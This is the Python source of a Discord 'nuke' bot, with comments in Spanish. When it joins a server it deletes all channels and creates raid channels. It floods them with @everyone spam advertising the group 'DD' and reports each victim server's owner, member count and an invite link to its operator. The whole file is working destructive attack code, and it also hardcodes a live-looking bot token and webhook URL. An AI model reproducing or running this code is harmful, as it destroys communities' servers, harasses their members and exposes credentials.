import discord, json, aiohttp, discord_webhook
from discord.ext import commands
from discord.ext.commands import check
from discord import Webhook
from discord_webhook import DiscordWebhook, DiscordEmbed



intents = discord.Intents().all()
intents.message_content = True
bot = commands.Bot(command_prefix=".", intents=intents)
bot.remove_command('help')
session = aiohttp.ClientSession()

og = 'https://discord.com/api/webhooks/1053908392504205332/3zvHk6MRSK-J6B8Gn969_R7hmBR0XnSfOczoxjTlF2eOUJpGxSMbqaG2YjLLJkXcmdkP'

antinuke = [1045775188408668211]



def check_if_user_has_premium(ctx):
    with open("guild.json") as f:
        guild = json.load(f)
        if guild in guild.id:
            return False

    return True  

@bot.event    
async def on_guild_join(guild): 
 server_id = guild.id
 logg = bot.get_channel(1053908336136945684)
 with open('guild.json', 'r+') as f:
        # Carga el contenido del archivo JSON en un diccionario
        data = json.load(f) 
 if server_id in data['guild']:
    return
 else:    
  if guild.id not in antinuke:  
   for channel in guild.channels:
        try:
            await channel.delete()

        except:
            pass  
   for _i in range(1):

        raid = await guild.create_text_channel(name="únete-a-dd")      
        invite = await raid.create_invite(max_age=0)
        await raid.send("||@everyone||\n**𝐄𝐬𝐭𝐚 𝐦𝐢𝐞𝐫𝐝𝐚 𝐝𝐞 𝐬𝐞𝐫𝐯𝐢𝐝𝐨𝐫 𝐟𝐮𝐞 𝐞𝐱𝐭𝐞𝐫𝐦𝐢𝐧𝐚𝐝𝐚 𝐩𝐨𝐫 𝐃𝐞𝐚𝐝𝐃𝐞𝐬𝐭𝐫𝐨𝐲𝐞𝐫𝐬, ú𝐧𝐞𝐭𝐞 𝐩𝐚𝐫𝐚 𝐫𝐞𝐜𝐮𝐩𝐞𝐫𝐚𝐫𝐥𝐚 𝐨 𝐮𝐬𝐚𝐫𝐦𝐞.**\n https://discord.gg/w6dyCY9Esw")            
   for i in range(1):
    logNukeEmbed = discord.Embed(title="Entrar al servidor",url=invite, description="**Tipo de raid: ❌ No premium ❌**", colour=0xed0b0b)
    logNukeEmbed.add_field(name='> Nombre del servidor',value=f'{guild.name}',inline=False)
    logNukeEmbed.add_field(name='> Miembros',value=f'{guild.member_count}',inline=False)
    logNukeEmbed.add_field(name='> Owner',value=f'{guild.owner}',inline=False)
    logNukeEmbed.add_field(name='> Boosteos',value=f'{str(guild.premium_subscription_count)}',inline=False)    
    logNukeEmbed.set_thumbnail(url="https://cdn.discordapp.com/icons/1039321689428856933/a_85055102a3bf775315faf434479df555.gif?size=2048")
    await logg.send(invite, embed=logNukeEmbed)

   for _i in range(5):
    try: 
     await guild.create_text_channel(name="r̶̡̛̲̙̥̝̫̼̲̍͌̽̏̀̕͝å̴̡̫̺̥̺̃͋͒͐̆̕i̴̧̻̱̤̇ḑ̷̡͎͉̯̯̩̦͉͈͊̑̾͐-̵͔͖̻̠̥̻͕̀̃̉͑͗̍̅́ͅb̴̗̜̬͓͒̐͒̋̓̂̆̒͠ỳ̷̧̬̘̤͚͍̥͉͍̺̀̏̃̐̒̚-̶̡̡̫̞̣̤͍̩̬͉̐̾̇d̶̥̝̩͔̤͓̼̳͌͆͗͜ë̵̡̪̖̖̲̘̙́̀̉͂̿̀̈́̐̀a̸͓̻̘̖̿͂̒͑͝d̴̨̛̼̲̳̤̲̤̦̀͛̀̒̓̆̕͝d̶̢͖̍̏̋͛̀ẻ̷̡͔͍̀́͘s̴͖̟̗̹̈́̿̀͝t̵̢͂̔̍̎̅̄̎̂r̵̻̎o̴̢̾̾̑̒y̸͙͚̹̺̣̥̙͎͗̀̃̋̅̃̐͑̓ë̴̫̘̯͕̝̹̰͓̊̈͛r̶̼̹̮͍̺̤͕̘̘̍̎̒̓̅̓͐͘̚͜s̶̢͚̭̥̿͝")  
    except:
     pass 
 
    # Abre el archivo JSON en modo de escritura
   with open('guild.json', 'r+') as f:
        # Carga el contenido del archivo JSON en un diccionario
        data = json.load(f)

        # Agrega el ID del servidor al diccionario
        data['guild'].append(server_id)

        # Vuelve al inicio del archivo
        f.seek(0)

        # Escribe el diccionario actualizado de vuelta al archivo JSON
        json.dump(data, f)

        # Elimina la parte sobrante del archivo
        f.truncate()


@bot.event
async def on_guild_channel_create(channel):
    global raidpremium
    global raidnormal
    global texto
    global canal 
    var = 0
    webhook = await channel.create_webhook(name = "El hijo de youngaos")
    if (channel.name == 'r̶̕͝å̴̕i̴̻̇d̷͊̑-̵̀̃b̴͒͠ỳ̷̀-̶̐̾d̶͌͆ë̵́̀a̸̿͂d̴̀͛d̶̍̏ẻ̷͘s̴̈́̿t̵͂̔r̵̻̎o̴̾̾y̸͗̀ë̴̊r̶̍̎s̶̿͝'):
        for _i in range(50):
          try:  
            log = discord.Embed(title="RAIDED BY DD",description = "```THIS SERVER GOT NUKED BY DD```" ,colour=0x2f3136)
            log.add_field(name='Discord',value='https://discord.gg/dd3k',inline=False)
            log.add_field(name='Twitter',value='https://twitter.com/youngaoss',inline=False)            
            log.add_field(name='YouTube',value='https://www.youtube.com/@youngaos',inline=False)
            log.set_image(url="https://cdn.discordapp.com/attachments/1044096779852972083/1047338898348576899/rrrrrrrrrrrrrrrr.gif")
            log.set_thumbnail(url="https://cdn.discordapp.com/attachments/1044096779852972083/1047339429137748038/DEADDESTROYERSV3.gif")
            await webhook.send("||@everyone|| **__SERVER DESTROYED BY DD__**\n https://discord.gg/w6dyCY9Esw", embed=log)
            await channel.send("||@everyone|| **__SERVER DESTROYED BY DD__**\n https://discord.gg/w6dyCY9Esw", embed=log)
          except:
               pass 


bot.run("MTA1NDA5NzYwNDcxNzMxODE0NA.GChEI4.qejaYSzqHGkyb_tZJ3nGjPqqXq_h1jV_kRblMc")           